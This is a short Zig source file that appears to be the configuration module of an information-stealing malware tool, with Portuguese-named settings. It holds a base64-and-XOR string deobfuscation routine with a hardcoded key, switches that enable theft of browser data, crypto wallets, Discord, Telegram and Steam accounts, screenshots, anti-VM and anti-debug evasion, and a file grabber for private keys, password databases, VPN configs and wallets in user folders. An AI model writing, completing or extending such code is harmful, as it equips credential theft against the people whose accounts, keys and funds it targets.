const std = @import("std");

pub const obf_key = [_]u8{ 0x4b, 0x37, 0xd2, 0x8f, 0x1c, 0xa5, 0x6e, 0x93, 0x0f, 0x5a, 0xc8, 0x21, 0x7d, 0xe4, 0x19, 0xb6 };

pub fn decAlloc(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
    if (s.len == 0) return allocator.alloc(u8, 0);

    const decoded_len = try std.base64.standard.Decoder.calcSizeForSlice(s);
    const decoded = try allocator.alloc(u8, decoded_len);
    errdefer allocator.free(decoded);

    try std.base64.standard.Decoder.decode(decoded, s);

    for (decoded, 0..) |*b, i| {
        b.* = b.* ^ obf_key[i % obf_key.len];
    }
    return decoded;
}

// Configs
pub const roubar_navegadores = true;
pub const roubar_crypto = true;
pub const roubar_discord = true;
pub const roubar_telegram = true;
pub const roubar_steam = true;
pub const tirar_captura = true;
pub const coletar_info_sistema = true;
pub const persistir = false;
pub const auto_destruir = false;
pub const anti_vm = true;
pub const anti_debug = true;
pub const pegador_arquivos = true;

pub const extensoes_arquivo = [_][]const u8{
    ".txt", ".doc", ".docx", ".xls", ".xlsx",
    ".pdf", ".json", ".csv",
    ".db", ".sqlite",
    ".key", ".pem", ".ppk", ".kdbx",
    ".rdp", ".ovpn", ".conf",
    ".wallet", ".dat",
};

pub const tamanho_max_arquivo: i64 = 5 * 1024 * 1024;

pub const caminhos_pegador = [_][]const u8{
    "Desktop",
    "Documents",
    "Downloads",
};
